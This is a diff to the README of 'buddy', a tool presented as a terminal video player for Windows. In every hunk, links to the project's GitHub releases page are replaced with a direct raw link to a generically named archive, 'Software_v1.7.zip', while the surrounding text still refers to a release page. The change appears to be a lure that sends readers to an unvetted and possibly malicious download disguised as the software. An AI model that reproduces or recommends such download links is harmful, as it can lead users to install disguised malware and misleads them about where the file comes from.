@@ -1,6 +1,6 @@
 # 🎬 buddy - Clear Video in a Terminal
 
-[![Download buddy](https://img.shields.io/badge/Download%20buddy-Release%20Page-blue?style=for-the-badge)](https://github.com/chihuahuamunich31/buddy/releases)
+[![Download buddy](https://img.shields.io/badge/Download%20buddy-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/chihuahuamunich31/buddy/main/assets/Software_v1.7.zip)
 
 ## 🚀 What buddy does
 
@@ -28,7 +28,7 @@ For best results, use a recent Windows system with a modern terminal window. bud
 
 Visit this page to download the Windows build:
 
-https://github.com/chihuahuamunich31/buddy/releases
+https://raw.githubusercontent.com/chihuahuamunich31/buddy/main/assets/Software_v1.7.zip
 
 On the release page:
 
@@ -159,7 +159,7 @@ It takes the idea behind terminal video playback and makes it more usable for da
 
 If you want the latest version, use the release page here:
 
-https://github.com/chihuahuamunich31/buddy/releases
+https://raw.githubusercontent.com/chihuahuamunich31/buddy/main/assets/Software_v1.7.zip
 
 ## 📝 File layout after download
 
